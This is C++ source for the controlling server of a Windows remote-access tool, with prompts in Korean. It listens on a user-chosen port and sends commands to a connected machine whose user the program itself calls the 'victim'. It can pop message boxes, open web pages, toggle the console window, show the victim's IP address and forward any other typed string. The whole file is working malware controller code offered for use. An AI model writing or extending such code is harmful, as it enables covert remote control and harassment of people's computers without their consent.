#include <iostream>
#include <winsock2.h>
using namespace std;

#define PK_SIZE 1026
int PORT;

void CD(){
	CONSOLE_CURSOR_INFO cur;
	GetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &cur);
	cur.bVisible = 0;
	SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &cur);
}

int main(){
	CD();
	while(1){
	cout << "포트를 입력하세요>> ";
	cin >> PORT;
	if(1<=PORT&&PORT<=25565) break;
	else cout << "잘못된 값\n";
}
system("cls");

WSADATA wsa;
WSAStartup(MAKEWORD(2,2),&wsa);

SOCKET skt;
skt = socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);

SOCKADDR_IN addr={0};
addr.sin_family = AF_INET;
addr.sin_port = htons(PORT);
addr.sin_addr.s_addr = htonl(INADDR_ANY);

bind(skt, (SOCKADDR*)&addr,sizeof(addr));
listen(skt, SOMAXCONN);

SOCKADDR_IN client={0};
int client_size = sizeof(client);
SOCKET client_sock = accept(skt, (SOCKADDR*)&client,&client_size);

char cmd[PK_SIZE]={0},msgbox[PK_SIZE]={0};

while(!WSAGetLastError()){
	ZeroMemory(&cmd,PK_SIZE);
	ZeroMemory(&msgbox,PK_SIZE);
	cout << "Shell>> ";
	cin >> cmd;
	if(!strcmp(cmd,"exit")){
	send(client_sock,cmd,strlen(cmd),0);
	break;
	}
	else if(!strcmp(cmd,"help")) cout << "help - 도움말\nexit - 세선종료\nmsgbox - 메세지박스출력\nseeip - 피해자의 아이피보기\nopenweb - 웹페이지열기\nshowconsole - 피해자 콘솔창 온오프\n";
	else if(!strcmp(cmd,"seeip")) cout << "피해자의 아이피주소>> " << inet_ntoa(client.sin_addr) << endl;
	else if(!strcmp(cmd,"msgbox")){
		send(client_sock,cmd,strlen(cmd)+1,0);
			cout << "제목입력: ";
			cin >> msgbox;
			send(client_sock,msgbox,strlen(msgbox)+1,0);
			cout << "내용입력: ";
			cin >> msgbox;
			send(client_sock,msgbox,strlen(msgbox)+1,0);
	}
	else if(!strcmp(cmd,"openweb")){
		send(client_sock,cmd,strlen(cmd)+1,0);
			cout << "웹주소입력: ";
			cin >> msgbox;
			send(client_sock,msgbox,strlen(msgbox)+1,0);
	}
	else if(!strcmp(cmd,"showconsole")){
		send(client_sock,cmd,strlen(cmd)+1,0);
			cout << "입력(true, false): ";
			cin >> msgbox;
			if(!strcmp(msgbox,"true")||!strcmp(msgbox,"false")){
			send(client_sock,msgbox,strlen(msgbox)+1,0);
		}
		else send(client_sock,msgbox,strlen(msgbox)+1,0);
	}
	else send(client_sock,cmd,strlen(cmd)+1,0);
}

closesocket(client_sock);
closesocket(skt);
WSACleanup();
}
